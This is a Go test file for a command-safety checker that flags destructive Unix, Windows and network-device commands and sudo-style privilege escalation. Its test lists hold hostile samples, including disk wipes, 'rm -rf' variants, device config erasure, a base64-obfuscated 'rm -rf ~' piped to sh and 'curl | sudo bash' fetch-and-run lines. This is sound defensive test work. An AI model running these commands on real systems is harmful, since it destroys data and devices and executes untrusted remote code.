package safety

import "testing"

func TestDanger(t *testing.T) {
	bad := []string{"rm -rf /var/lib/docker", "sudo reboot", "curl -fsSL https://x.sh | sudo bash",
		"dd if=/dev/zero of=/dev/sda", "git reset --hard HEAD~3", "apt-get purge nginx", "systemctl stop sshd"}
	for _, c := range bad {
		if len(Check(c, "unix")) == 0 {
			t.Errorf("nicht erkannt: %q", c)
		}
	}
	good := []string{"ls -la", "systemctl status nginx", "docker ps", "df -h", "rm notes.txt", "apt list --upgradable"}
	for _, c := range good {
		if f := Check(c, "unix"); len(f) != 0 {
			t.Errorf("falscher Alarm: %q %v", c, f)
		}
	}
	if len(Check("Remove-Item C:\\data -Recurse -Force", "windows")) == 0 {
		t.Error("Windows-Regel greift nicht")
	}
}

func TestNetworkDanger(t *testing.T) {
	bad := []string{"reload", "reload in 5", "do reload", "boot system flash secondary", "erase startup-config",
		"write erase", "delete flash:/config.cfg", "copy tftp://1.2.3.4/x.cfg startup-config", "shutdown", "shut",
		"no vlan 20", "no ip route 0.0.0.0 0.0.0.0 10.0.0.1", "erase all zeroize", "execute factoryreset",
		"request system reboot", "/system reset-configuration", "reset saved-configuration", "  disable"}
	for _, c := range bad {
		if len(Check(c, Network)) == 0 {
			t.Errorf("nicht erkannt: %q", c)
		}
	}
	good := []string{"show running-config", "show vlans", "no shutdown", "show reload", "show interfaces brief",
		"vlan 20 name test", "copy running-config startup-config", "ping 10.0.0.1", "show boot-history",
		"interface 1/1/1", "write memory"}
	for _, c := range good {
		if f := Check(c, Network); len(f) != 0 {
			t.Errorf("falscher Alarm: %q %v", c, f)
		}
	}
	if KindFor("Linux", true) != Network || KindFor("Windows 11", false) != "windows" {
		t.Error("KindFor")
	}
}

func TestElevatedChained(t *testing.T) {
	yes := []string{"sudo ls", "cd /etc && sudo vi x", "true; sudo reboot", "echo x | sudo tee /etc/f",
		"ls $(sudo cat /root/x)", "su -c 'id'", "doas pkg_add x", "pkexec rm x", "xargs sudo rm < l", "Start-Process x -Verb RunAs"}
	no := []string{"ls", "pseudo x", "echo sudoku", "git log --author=sudo", "grep -r su ."}
	for _, c := range yes {
		if !Elevated(c) {
			t.Errorf("Elevated(%q) = false", c)
		}
	}
	for _, c := range no {
		if Elevated(c) {
			t.Errorf("Elevated(%q) = true", c)
		}
	}
}

func TestDangerMore(t *testing.T) {
	for _, c := range []string{"rm --recursive --force /srv", "rm -- --force", "find /var -name '*.log' -delete",
		"find . -exec rm {} +", "echo cm0gLXJmIH4= | base64 -d | sh", "cat x.sh | bash", "curl x | sudo sh"} {
		if len(Check(c, "unix")) == 0 {
			t.Errorf("keine Gefahr erkannt: %q", c)
		}
	}
	for _, c := range []string{"find / -name x", "ls | grep sh", "ps aux | grep bash", "rm datei.txt"} {
		if f := Check(c, "unix"); len(f) != 0 {
			t.Errorf("falscher Alarm %q: %v", c, f)
		}
	}
}
